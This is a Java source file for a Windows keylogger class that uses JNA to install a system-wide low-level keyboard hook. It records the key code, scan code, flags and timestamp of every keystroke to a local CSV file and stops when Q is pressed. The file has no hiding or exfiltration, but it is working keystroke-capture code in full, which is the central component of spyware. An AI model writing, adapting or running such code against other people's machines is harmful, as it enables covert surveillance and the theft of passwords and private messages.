package co.uk.baconi.keylogger.framework.impl;

import static co.uk.baconi.keylogger.framework.constants.Strings.COMMA;
import static co.uk.baconi.utils.StringUtil.concat;
import co.uk.baconi.keylogger.framework.constants.Numbers;
import co.uk.baconi.keylogger.framework.interfaces.KeyConverter;
import co.uk.baconi.keylogger.framework.interfaces.KeyLogger;
import co.uk.baconi.utils.LoggerUtil;
import co.uk.baconi.utils.TimeUtil;

import com.sun.jna.Platform;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef.HMODULE;
import com.sun.jna.platform.win32.WinDef.LRESULT;
import com.sun.jna.platform.win32.WinDef.WPARAM;
import com.sun.jna.platform.win32.WinUser;
import com.sun.jna.platform.win32.WinUser.HHOOK;
import com.sun.jna.platform.win32.WinUser.KBDLLHOOKSTRUCT;
import com.sun.jna.platform.win32.WinUser.LowLevelKeyboardProc;
import com.sun.jna.platform.win32.WinUser.MSG;

public final class WindowsKeyLogger extends AbstractImpl implements KeyLogger {
    private static final String LOG_ERROR_MSG = "This key logger implementation should only be used on a Windows OS.";
    private static final String EXCEPTION_ERROR_MSG = "This key logger implementation only supports Windows.";

    private static volatile boolean quit;
    private final HHOOK hhk;

    private WindowsKeyLogger() {
        super();

        if (!Platform.isWindows()) {
            log.error(LOG_ERROR_MSG);
            throw new RuntimeException(EXCEPTION_ERROR_MSG);
        }
        final HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);
        final WindowsKeyboardHook keyboardHook = new WindowsKeyboardHook(this);
        hhk = User32.INSTANCE.SetWindowsHookEx(WinUser.WH_KEYBOARD_LL, keyboardHook, hMod, Numbers.ZERO);
    }

    @Override
    public void startLogging(final KeyConverter keyConverter) {
        new Thread() {
            @Override
            public void run() {
                while (!quit) {
                    try {
                        Thread.sleep(Numbers.TEN);
                    } catch (final Exception e) {
                    }
                }
                User32.INSTANCE.UnhookWindowsHookEx(hhk);
                System.exit(Numbers.ZERO);
            }
        }.start();

        int result;
        final MSG msg = new MSG();

        while ((result = User32.INSTANCE.GetMessage(msg, null, Numbers.ZERO, Numbers.ZERO)) != Numbers.ZERO) {
            if (result == Numbers.MINUS_ONE) {
                break;
            } else {
                User32.INSTANCE.TranslateMessage(msg);
                User32.INSTANCE.DispatchMessage(msg);
            }
        }

        User32.INSTANCE.UnhookWindowsHookEx(hhk);
    }

    private HHOOK getHHOOK() {
        return hhk;
    }

    private void quit() {
        quit = true;
    }

    private static final class WindowsKeyboardHook implements LowLevelKeyboardProc {
        private static final int Q_KEY_VKCODE = 81;

        private static final String[] LOG_HEADINGS = { "wParam", "vkCode", "flags", "scanCode", "dwExtraInfo", "time",
                "Year-Month-Day", "Hour:Minute:Second:Millisecond" };

        private static final LoggerUtil LOGGER = LoggerUtil.getLogger("KeyHookLog.csv", false, true, LOG_HEADINGS);

        private final WindowsKeyLogger parent;

        public WindowsKeyboardHook(final WindowsKeyLogger parent) {
            this.parent = parent;
        }

        @Override
        public LRESULT callback(final int nCode, final WPARAM wParam, final KBDLLHOOKSTRUCT info) {
            if (nCode >= 0) {
                if (wParam.intValue() == WinUser.WM_KEYDOWN) {
                    LOGGER.log(concat(nCode, COMMA, wParam, COMMA, info.vkCode, COMMA, info.flags, COMMA,
                            info.scanCode, COMMA, info.dwExtraInfo, COMMA, info.time, COMMA,
                            TimeUtil.getCurrentDateTime()));

                    if (info.vkCode == Q_KEY_VKCODE) {
                        parent.quit();
                    }
                }
            }
            return User32.INSTANCE.CallNextHookEx(parent.getHHOOK(), nCode, wParam, info.getPointer());
        }
    }

}
